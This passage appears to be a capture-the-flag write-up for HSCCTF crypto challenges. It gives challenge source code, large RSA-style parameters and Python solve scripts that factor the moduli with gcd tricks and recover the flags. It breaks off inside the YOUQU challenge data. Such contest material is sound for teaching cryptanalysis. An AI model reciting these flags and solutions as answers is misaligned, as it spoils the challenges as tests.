class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;HSCCTF&#123;66666666666666666666666666666666666&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">g, r1, r2, k1, k2 = [randint(<span class="number">1</span>, n) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">g1 = powmod(g, r1 * (p - <span class="number">1</span>), n)</span><br><span class="line">g2 = powmod(g, r2 * (q - <span class="number">1</span>), n)</span><br><span class="line">c1 = m * powmod(g1, k1, n) % n</span><br><span class="line">c2 = m * powmod(g2, k2, n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc=&#x27;</span>, [c1, c2])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n, g1, g1=&#x27;</span>, [n, g1, g2])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">enc= [15258813801182767957948809411445530114743580005667897427534365589851124401953952700888032330082278736578651674105204553630115929829327520950316902504433079359916257355896937562916556083469602985115254272625361902512966905366505705193603115063442567259505806926885597909346860116511116593562896739734663097631870026814495999405532329662713707140991693625596972404484374296588505369466138353714461787853643947646268147993568111775200297788443085689323703846485412670213780175163562460311256388185948613714551169278328397181176821021494625532973065606678522088011055084956579073665474553688838705105692370860815836968744, 6812252973072040071827764212287068485224506664962923279994614164374840095630460681859406585838865259535150445414577263383839286602668872146630568583093203237350230531896113453730563536559780725054737930704052263836882704963528437893607940373145674848731274193348770450738356162141551719346994698149112827383011042635625991946491545698464513315705253441372356270248537025391519052228332747340090073726648071921053097612521949040588826684887577900030607964457543549015338544684381220552952995724701579427363382069065679545196826947900332605250858694574423497096207350532949517663416877954484913664168104807510052994343]</span></span><br><span class="line"><span class="string">n, g1, g1= [20807018344486474639307429177279931766730766338068107239915507489300098048895435781756514265069820029246382818970733268271541419058569567895618666922180270584064313671561310704041755422624879418184008100473568396190523033929320245716340019444764233261191278982354931492880877566550189410854395486995604287009460090861952156686772486228583819235930673806632618770875593810617784176409247510465542253043645164164225524491704753384493817563203956665022724674535516870726747405974392352500432805602085261375142216501656342533659731098891481615791354504343987459436489040377662127479793769523359343534307819013289699807101, 13669954919111873554762685722926885077118528999414402163291237939605095249827361266585404348819936899557500751307328088850133462100189908649705354225171362748567332828733792410877365393472368767642223613483944864421225366984013053159643284842823692865975521013400160643858123645513020647367033022539177063702511618272018019345686324322865461583030805528508961559861228807898458344763909703624723082316946660539208262816734999777236686904487167545596412866146192769859422435979617441355968077981338491466670291310491623996943880557071723073298267310617017933994938481600905833829730599911183096116409487608858717083764, 16004755272896973088305242134835363565950101667041191767091338528075710730690484241256646402124331734165332717221873300040844257120250717798419429003342474882969292183331631773486056363790119500409511338474885148624744719334829519138941747721940978742668429331169327121848561577357339194970483392418062307133642660625962426570987080348107999849220769541832138719358407833846252908305766546561532003650472770370573552424932908544299331489147220956574184822433945571318688467182365231955276573176433559755313822566687880866791301904461559170416753669109833335824210853322226762705537051009387847122221014380228383127427]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44017838/article/details/105459003">V&amp;N2020 - Fast</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c1,c2 = [<span class="number">15258813801182767957948809411445530114743580005667897427534365589851124401953952700888032330082278736578651674105204553630115929829327520950316902504433079359916257355896937562916556083469602985115254272625361902512966905366505705193603115063442567259505806926885597909346860116511116593562896739734663097631870026814495999405532329662713707140991693625596972404484374296588505369466138353714461787853643947646268147993568111775200297788443085689323703846485412670213780175163562460311256388185948613714551169278328397181176821021494625532973065606678522088011055084956579073665474553688838705105692370860815836968744</span>, <span class="number">6812252973072040071827764212287068485224506664962923279994614164374840095630460681859406585838865259535150445414577263383839286602668872146630568583093203237350230531896113453730563536559780725054737930704052263836882704963528437893607940373145674848731274193348770450738356162141551719346994698149112827383011042635625991946491545698464513315705253441372356270248537025391519052228332747340090073726648071921053097612521949040588826684887577900030607964457543549015338544684381220552952995724701579427363382069065679545196826947900332605250858694574423497096207350532949517663416877954484913664168104807510052994343</span>]</span><br><span class="line">n, g1, g2= [<span class="number">20807018344486474639307429177279931766730766338068107239915507489300098048895435781756514265069820029246382818970733268271541419058569567895618666922180270584064313671561310704041755422624879418184008100473568396190523033929320245716340019444764233261191278982354931492880877566550189410854395486995604287009460090861952156686772486228583819235930673806632618770875593810617784176409247510465542253043645164164225524491704753384493817563203956665022724674535516870726747405974392352500432805602085261375142216501656342533659731098891481615791354504343987459436489040377662127479793769523359343534307819013289699807101</span>, <span class="number">13669954919111873554762685722926885077118528999414402163291237939605095249827361266585404348819936899557500751307328088850133462100189908649705354225171362748567332828733792410877365393472368767642223613483944864421225366984013053159643284842823692865975521013400160643858123645513020647367033022539177063702511618272018019345686324322865461583030805528508961559861228807898458344763909703624723082316946660539208262816734999777236686904487167545596412866146192769859422435979617441355968077981338491466670291310491623996943880557071723073298267310617017933994938481600905833829730599911183096116409487608858717083764</span>, <span class="number">16004755272896973088305242134835363565950101667041191767091338528075710730690484241256646402124331734165332717221873300040844257120250717798419429003342474882969292183331631773486056363790119500409511338474885148624744719334829519138941747721940978742668429331169327121848561577357339194970483392418062307133642660625962426570987080348107999849220769541832138719358407833846252908305766546561532003650472770370573552424932908544299331489147220956574184822433945571318688467182365231955276573176433559755313822566687880866791301904461559170416753669109833335824210853322226762705537051009387847122221014380228383127427</span>]</span><br><span class="line"></span><br><span class="line">p = gcd(g1-<span class="number">1</span>,n)</span><br><span class="line">q = gcd(g2-<span class="number">1</span>,n)</span><br><span class="line"><span class="built_in">print</span>(p*q==n)</span><br><span class="line"></span><br><span class="line">m = crt([c1%p,c2%q],[p,q])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;HSCCTF&#123;Any_restr1ct1ons_all_begins_with_his_own_heart&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="MIXED"><a href="#MIXED" class="headerlink" title="MIXED"></a>MIXED</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">q1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">p1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">n1 = q * p1</span><br><span class="line">n2 = p * q1</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">h0 = <span class="built_in">pow</span>(<span class="number">2023</span> * p + <span class="number">2024</span>, q1, n2)</span><br><span class="line">h1 = <span class="built_in">pow</span>(<span class="number">2024</span> * p1 + <span class="number">2023</span> * q, <span class="number">114</span>, n1)</span><br><span class="line">h2 = <span class="built_in">pow</span>(<span class="number">2023</span> * p1 + <span class="number">2024</span> * q, <span class="number">514</span>, n1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n1 = <span class="subst">&#123;n1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n2 = <span class="subst">&#123;n2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h0 = <span class="subst">&#123;h0&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h1 = <span class="subst">&#123;h1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h2 = <span class="subst">&#123;h2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n1 = 14689930167621480307737218855980844793204825453111553640005733004311399091452749419195261723160562669712981077205514482387428543859060408330555457873612388970840075555219318724209919379670375754436986322725018229701175825510253987615017542205904982728558285520666278391637251512741084978804344612886660251741043298476839942441197788722691248949008018299101517153067904692310160459839327965213126456776042470327923603098133019640956702820908299859534676381094974148722668171932091455546601087513513432342088579253210930555185169910878657816252698605590059713584044287411998445279104965229112287195772355914014694372863</span></span><br><span class="line"><span class="comment"># n2 = 17914624231045471060767877283214815212078805279600237578901916178851704643026979522270658635212967285131654546207286875722198040564094351690066028556053274118826426726436922152056884333790850220488793722836758989770231697392015361745717234225528175411653330848965062023338707342188196332661335758350340958332400847642883219650661408895191363079017750144776587598058350920393498114498603046807597288603882782473322630631915467470131090200369527436760313289344813744004003957932606166823948354564464154141854938585629799995141656546295799610158824771809513458197812936595649326475123400845178122171317543843802357238737</span></span><br><span class="line"><span class="comment"># c = 13183645788828584902734975771833842634134772971197066374278716198331982362845597338541987579827576129126962300555023319276896080171662261983323670516457816608069076576704379871559881585100353737989915143190277856145677733747073530969459479608854483866886381406790221076900624083605418670450439523062190633487764982399334967431524831264337949814367905185282600511829794170139623625545288981992093108619556180352620171550284923452864402624195790781899415138548827684042790774382313520961335293225295922563245148598807498320652973409239921962292395269739151692443069186695137458774227330748775469621908962878548784542656</span></span><br><span class="line"><span class="comment"># h0 = 5690435858632801053001568276569200811072324786394351282330736437777643891675713760267573500875018036769819201228707494676033534733516436880434000381152290529934127584047681184797730806321117079578438213106595566102910231831641994870770844810797745935336962801658360541755214075101149142486964461669833043007174173934693214526552375910644574723526164021660497474760514459351270699055076380763188021265735007339272243426286470006040246926184305520860068095134003662496837644875879106318233600478000160450338727054920011063536387532763661934972965357326471012678550188382945584128136131833085006239075931753900705852481</span></span><br><span class="line"><span class="comment"># h1 = 12771704142231361356944931328203992824809472923288035056741145310446323135378739806430357600688780862532180394967607429708811767590541126019805423171023560973250443508427614362854583240402451944730512334908779225174763498122005198084487562912524477476241978066554026569609494641830034817298185887790987627444544391680388213205514284116732325350187204519755399841372144149840914651521842402817701298224803289451378581226204084757079457612984358925767378458994608562174048729806309230061089552045138514542758457243626150673888166620841134063713151240297774551489301504222933127458884374866611598279831562420720169790688</span></span><br><span class="line"><span class="comment"># h2 = 10768269134499905916388929049595509895751098112372323618798542159569174051578701710549609054808995774168931375186213550074900373023970882450822655786787740452681278837907191091338575561570211280095894576674089666981683405385847773819238581725093823429776684561667462626941518248024517707992035438082636259838822562843169441572048956484831730615047363383911454662789736761572912893234212875097536978423758275178050708616505311352511923810654873380808201395656416903900326634569672173228265730515727327832588326581592485713225927319225942965110285477266200380452637746037672411388696006933080509164615786616058664496851</span></span><br></pre></td></tr></table></figure></blockquote><p>参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/Luiino/article/details/128509343">东华杯 - fermat’s revenge</a> 和 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52193383/article/details/120317438">GKCTF 2021 - RRRRsa</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">14689930167621480307737218855980844793204825453111553640005733004311399091452749419195261723160562669712981077205514482387428543859060408330555457873612388970840075555219318724209919379670375754436986322725018229701175825510253987615017542205904982728558285520666278391637251512741084978804344612886660251741043298476839942441197788722691248949008018299101517153067904692310160459839327965213126456776042470327923603098133019640956702820908299859534676381094974148722668171932091455546601087513513432342088579253210930555185169910878657816252698605590059713584044287411998445279104965229112287195772355914014694372863</span></span><br><span class="line">n2 = <span class="number">17914624231045471060767877283214815212078805279600237578901916178851704643026979522270658635212967285131654546207286875722198040564094351690066028556053274118826426726436922152056884333790850220488793722836758989770231697392015361745717234225528175411653330848965062023338707342188196332661335758350340958332400847642883219650661408895191363079017750144776587598058350920393498114498603046807597288603882782473322630631915467470131090200369527436760313289344813744004003957932606166823948354564464154141854938585629799995141656546295799610158824771809513458197812936595649326475123400845178122171317543843802357238737</span></span><br><span class="line">c = <span class="number">13183645788828584902734975771833842634134772971197066374278716198331982362845597338541987579827576129126962300555023319276896080171662261983323670516457816608069076576704379871559881585100353737989915143190277856145677733747073530969459479608854483866886381406790221076900624083605418670450439523062190633487764982399334967431524831264337949814367905185282600511829794170139623625545288981992093108619556180352620171550284923452864402624195790781899415138548827684042790774382313520961335293225295922563245148598807498320652973409239921962292395269739151692443069186695137458774227330748775469621908962878548784542656</span></span><br><span class="line">h0 = <span class="number">5690435858632801053001568276569200811072324786394351282330736437777643891675713760267573500875018036769819201228707494676033534733516436880434000381152290529934127584047681184797730806321117079578438213106595566102910231831641994870770844810797745935336962801658360541755214075101149142486964461669833043007174173934693214526552375910644574723526164021660497474760514459351270699055076380763188021265735007339272243426286470006040246926184305520860068095134003662496837644875879106318233600478000160450338727054920011063536387532763661934972965357326471012678550188382945584128136131833085006239075931753900705852481</span></span><br><span class="line">h1 = <span class="number">12771704142231361356944931328203992824809472923288035056741145310446323135378739806430357600688780862532180394967607429708811767590541126019805423171023560973250443508427614362854583240402451944730512334908779225174763498122005198084487562912524477476241978066554026569609494641830034817298185887790987627444544391680388213205514284116732325350187204519755399841372144149840914651521842402817701298224803289451378581226204084757079457612984358925767378458994608562174048729806309230061089552045138514542758457243626150673888166620841134063713151240297774551489301504222933127458884374866611598279831562420720169790688</span></span><br><span class="line">h2 = <span class="number">10768269134499905916388929049595509895751098112372323618798542159569174051578701710549609054808995774168931375186213550074900373023970882450822655786787740452681278837907191091338575561570211280095894576674089666981683405385847773819238581725093823429776684561667462626941518248024517707992035438082636259838822562843169441572048956484831730615047363383911454662789736761572912893234212875097536978423758275178050708616505311352511923810654873380808201395656416903900326634569672173228265730515727327832588326581592485713225927319225942965110285477266200380452637746037672411388696006933080509164615786616058664496851</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">h1x = <span class="built_in">pow</span>(h1 * <span class="built_in">pow</span>(<span class="number">2023</span>,<span class="number">114</span>,n1),<span class="number">514</span>,n1)</span><br><span class="line">h2x = <span class="built_in">pow</span>(h2 * <span class="built_in">pow</span>(<span class="number">2024</span>,<span class="number">514</span>,n1),<span class="number">114</span>,n1)</span><br><span class="line">q = gcd(h2x-h1x,n1)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line">kp = h0-<span class="built_in">pow</span>(<span class="number">2024</span>,n2,n2)</span><br><span class="line">p = gcd(n2,kp)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;hscctf&#123;35d7ecc2-6216-4f09-b052-3de921f170b6&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="YOUQU"><a href="#YOUQU" class="headerlink" title="YOUQU"></a>YOUQU</h3><blockquote><p>出题人很有趣,给你函数了直接解吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.polynomial <span class="keyword">import</span> polynomial <span class="keyword">as</span> poly</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, y, z, mod</span>):</span><br><span class="line">    init_poly = poly.polymul(x, y)</span><br><span class="line">    res_poly = poly.polydiv(init_poly % z, mod)[<span class="number">1</span>] % z</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.<span class="built_in">round</span>(res_poly))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y, z, mod</span>):</span><br><span class="line">    init_poly = poly.polyadd(x, y)</span><br><span class="line">    res_poly = poly.polydiv(init_poly % z, mod)[<span class="number">1</span>] % z</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.<span class="built_in">round</span>(res_poly))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q2</span>(<span class="params">lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, <span class="number">2</span>, lenth1, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qz</span>(<span class="params">z, lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, z, lenth1, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>(<span class="params">lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.random.normal(<span class="number">0</span>, <span class="number">2</span>, size=lenth1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jlkey</span>(<span class="params">lenth1, z, mod</span>):</span><br><span class="line">    s = q2(lenth1)</span><br><span class="line">    g = qz(z, lenth1)</span><br><span class="line">    e1 = guess(lenth1)</span><br><span class="line">    t = add(mul(g, s, z, mod), e1, z, mod)</span><br><span class="line">    key = [g, t, s]</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jl</span>(<span class="params">key, length1, n, p, mod, msg</span>):</span><br><span class="line">    jlm = []</span><br><span class="line">    mm = <span class="built_in">hex</span>(msg)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(mm)):</span><br><span class="line">        jlm.append(<span class="built_in">ord</span>(mm[i]))</span><br><span class="line"></span><br><span class="line">    m = np.array(jlm + [<span class="number">0</span>] * (length1 - <span class="built_in">len</span>(jlm)), dtype=np.int64) % p</span><br><span class="line">    d = n // p</span><br><span class="line">    dm = d * m % n</span><br><span class="line">    e2 = guess(length1)</span><br><span class="line">    e3 = guess(length1)</span><br><span class="line">    r = q2(length1)</span><br><span class="line">    g = key[<span class="number">0</span>]</span><br><span class="line">    t = key[<span class="number">1</span>]</span><br><span class="line">    w = add(add(mul(t, r, n, mod), e2, n, mod), dm, n, mod)</span><br><span class="line">    v = add(mul(g, r, n, mod), e3, n, mod)</span><br><span class="line">    c = [w, v]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">o = <span class="number">128</span></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">62</span></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">32</span></span><br><span class="line">mod = np.array([<span class="number">1</span>] + [<span class="number">0</span>] * (o - <span class="number">1</span>) + [<span class="number">1</span>])</span><br><span class="line">key = jlkey(o, n, mod)</span><br><span class="line">flag = <span class="string">&#x27;HSCCTF&#123;fakeflag_xin_nian_kuai_le&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">c = jl(key, o, n, p, mod, m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;w =&quot;</span>, c[<span class="number">0</span>].tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;v =&quot;</span>, c[<span class="number">1</span>].tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;g =&quot;</span>, key[<span class="number">0</span>].tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;t =&quot;</span>, key[<span class="number">1</span>].tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s =&quot;</span>, key[<span class="number">1</span>].tolist())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">w = [4456121292753321984, 2695388220323384832, 1125798304404134912, 1389165333028469760, 3720515311443086336, 1806160162087117824, 1710165564223285248, 3854525633894178816, 4160032803226148864, 3223993978734964736, 188029029972998144, 2283288149728718848, 178098730553155584, 400166020473782272, 4426677526375129088, 1768526165797007360, 4596103848246980608, 3143341953117548544, 4113813229295153152, 1444787342796136448, 1749143783191330816, 601663717837410304, 1976180375223943168, 899486064067571712, 2467702122158211072, 1442313048691163136, 2977506408218411008, 1106991111199326208, 844904722420957184, 1013497211561496576, 4250614525386129408, 1677797764964532224, 4212901529405988864, 2561734724771299328, 1890807629146202112, 951039123411230720, 881428262835757056, 514344970914586624, 3072465238399721472, 1294633561516974080, 4471068621313253376, 2978038764905480192, 1256294011046658048, 2885789906784919552, 1808546586690191360, 3846883621647482880, 422980376119787520, 3401510714240147456, 3024926897503240192, 3504641379026477056, 2686993749796929536, 4084804987293286400, 1949654215988994048, 2949577339713200128, 2514172581835300864, 614361226066452480, 1560522408220647424, 1215782736092413952, 1705607337158410240, 3789095360729792512, 126768310879952896, 3564560282876477440, 4112635401656336384, 488963213586022400, 3263989278014881792, 1190526290525741056, 3726804923972673536, 2773020963465314304, 2008550394681090048, 2877753734522249216, 3318721688589254656, 2685195110085615616, 2120287225013829632, 2837075008393977856, 680647261446750208, 2672034759831756800, 586790221783564288, 4413791420559310848, 753748175057453056, 4156435215025135616, 1753634903657668608, 3868573500772638720, 1065381465124585472, 1951729611177713664, 833463289401663488, 3083559584672243712, 2453364017450852352, 3187954181254758400, 2701962603281113088, 1657135743981748224, 3393942972234113024, 3224375546132267008, 1637663670848045056, 2226464092285288448, 3426678970486587392, 3746864906767974400, 892187878069846016, 1566105953383768064, 1841796609436766208, 102854404605427712, 1384852880673484800, 2187150610629812224, 3960839367218393088, 798293770690805760, 172119736121323520, 2434320282093170688, 3398926147058458624, 858963714965422080, 3371154991043334144, 1537312801335345152, 2963315646558453760, 4058550201296797696, 1544831164568528896, 4296983781331357696, 3597399236973740032, 1172234645379473408, 1811007296491237376, 1364782914640955392, 1942828798540959744, 1312644494190576640, 540671172853423104, 2521681537802540032, 3678999552996606976, 3522586936321518592, 3355286245326997504, 1724989423167225856, 2857616461138001920, 3550411157752463360]</span></span><br><span class="line"><span class="string">v = [3004075223514152960, 375766571298967040, 3918175633582001664, 298998053399571840, 4539733962165100544, 3415675319003214848, 557497174827461120, 1187181217327680512, 42761045408950272, 4539692406094923776, 3474777010512353280, 807990709249906688, 4401927180657766400, 628439373724332032, 3552565694197467136, 1229559664627433472, 2735485480783970304, 340251515454152704, 535029869298274304, 1089634905489248256, 1745435675342262272, 2211405319829864448, 3166387633265565696, 3356595592575791104, 811586262403354624, 1658544963444764672, 2801381922146680832, 1906405005677551616, 2764661089781948416, 348852661152833536, 2843732326950182912, 3655220640882900992, 2735228541582770176, 984245520265568256, 847631674608009216, 4278557074339209216, 354445030770749440, 552426514839019520, 3037890003690143744, 3845527152479436800, 686613871844605952, 1987014853275738112, 129221415412514816, 884028654840045568, 893161048767537152, 4428861422755028992, 1977654893495033856, 2683055322869915648, 4466344498597339136, 2820131774980661248, 2105607478169853952, 768444766180638720, 212987987936600064, 1576117523911901184, 1650389830627762176, 1915750840791851008, 4109009172913405952, 2218053892260061184, 3863963349465956352, 2990430210085863424, 1274030477779271680, 1711547929466978304, 1157679433574768640, 156097645996949504, 3695677787747401728, 4322888783310766080, 4546024412016992256, 2655974462028947456, 1604656974594400256, 2045021548923273216, 3161689730583207936, 8339332591755263, 2341948229963612160, 3607706207127453696, 469234496887414784, 973715854261501952, 789210633607102464, 4424949506055979008, 1542517731370860544, 182468406585786368, 1807090988320792576, 1850374377172516864, 2618527682038956032, 1262867559425187840, 938222240300924928, 4591256432328728576, 2044671823654682624, 3467964150293766144, 79543117595951104, 2185630104198291456, 3728244444110430208, 156056289984327680, 4390349499275018240, 1751182369256157184, 2162985531302232064, 2761554017168584704, 2829764058526203904, 2028689816016191488, 146286463995781120, 3720834471976288256, 2917463735459491840, 4566476477728677888, 3722002688823242752, 4245856959119122432, 3425954365963665408, 3618936531494342656, 3695636186696466432, 1423352273706041344, 158921080583421952, 4351926341975711744, 3376292832678187008, 3295795181429579776, 3267875754319810560, 2363850527793784832, 888488262224822272, 1097387081646508032, 3686827109357189120, 297511993689784320, 3698586652027076608, 1126524981060736000, 1227462499250052096, 195965752955788032, 378621325977167872, 4568860371418834944, 3806982850127191040, 2330191690590402560, 965690431040995328, 2254601344237207552]</span></span><br><span class="line"><span class="string">g = [1271385667288255999, 3597939031086288160, 948720385886874982, 3730034896312885091, 155961058571645646, 873298702409407364, 3695415802847080551, 3935805697420664465, 303427777773526115, 2121504102169723388, 3117842710535023914, 2004730725267082784, 315298886702225235, 711790101004272712, 3469726824196756845, 3649946521480214795, 4269586158067475466, 1607685984041888423, 1866766258134518609, 4115571819844332380, 2381299916655519619, 2208948036365614734, 1946214530009282102, 330799912617809735, 3460498231343524429, 2694359423578749492, 793704330311549271, 1491532600134534859, 1606672420502700650, 561106526228105342, 1105025457886824442, 1443932433209975334, 4240908184445005305, 1954646486670721382, 4227369777555389059, 1563814260527576306, 771217858163031033, 1280424786084049063, 303853418224126180, 181918673882271714, 2212581027220765469, 2111888312694611250, 3581354821166105988, 1429049683930421764, 1357441041735699015, 3553280165847887597, 869489768651033960, 1107714765447012644, 2910143081602408601, 1433461290183315706, 3240132019514117541, 2465292834002904411, 1334470694725903257, 3156578894981065904, 35185442949043438, 645993467993501426, 1352915688916657829, 1521946784078789166, 2639858512187877401, 4315064694485922395, 3953315792354490874, 1587769214913102261, 3912000075342935904, 1887499577531299413, 309657057763429254, 769590223035802807, 4361036733963754384, 1446528785602732156, 1205711736426995533, 3683188791797133788, 921287773622604679, 3591274357626650529, 2745859155549230842, 4491978210538609848, 2444128709624329128, 1403888264551474491, 4377727165055311964, 1507498290240201527, 2952796830041690744, 1642562262970195060, 2847743992975447391, 4164239208310834247, 1967003682977431435, 2575799088251274004, 156708464748056204, 2403917842083313594, 